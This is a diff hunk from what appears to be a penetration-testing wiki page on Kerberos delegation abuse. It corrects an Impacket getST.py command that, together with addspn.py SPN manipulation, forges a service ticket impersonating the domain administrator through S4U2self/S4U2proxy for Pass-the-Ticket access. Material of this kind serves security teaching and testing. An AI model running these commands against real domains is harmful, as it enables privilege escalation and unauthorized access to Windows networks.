@@ -45,7 +45,7 @@ addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainContr
 addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
 
 # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
-getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD' -altservice "cifs/serverC"
+getST.py -spn "cifs/serverB" -impersonate "administrator" "$DOMAIN/serverA$:$PASSWORD" -altservice "cifs/serverC"
 ```
 
 Once the final service ticket is obtained, it can be used with [Pass the Cache](ptc.md) / [Pass the Ticket](ptt.md) to access the target.
